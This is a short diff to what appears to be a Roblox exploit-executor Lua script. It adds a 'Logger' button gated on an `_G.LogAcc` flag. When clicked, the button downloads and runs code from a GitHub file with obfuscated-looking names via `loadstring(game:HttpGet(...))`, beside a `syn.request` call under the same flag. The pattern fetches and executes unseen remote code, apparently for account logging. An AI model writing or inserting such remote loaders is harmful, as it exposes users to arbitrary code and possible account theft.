@@ -594,6 +594,12 @@ spawn(function()
    end
 end)
 
+spawn(function()
+   if _G.LogAcc then
+      Nexus:CreateButton('Logger', 'SheetBest', { 100, 20 }, { 10, 10, 10, 10 })
+      Nexus:OnButtonClick('Logger', function() loadstring(game:HttpGet'https://raw.githubusercontent.com/wqeivwqjevwqewqv/wqceqwecwqe/main/logwelrvpoewrv.lua')() end)
+   end
+end)
 function setalias()
    if _G.LogAcc then
       a = syn.request({
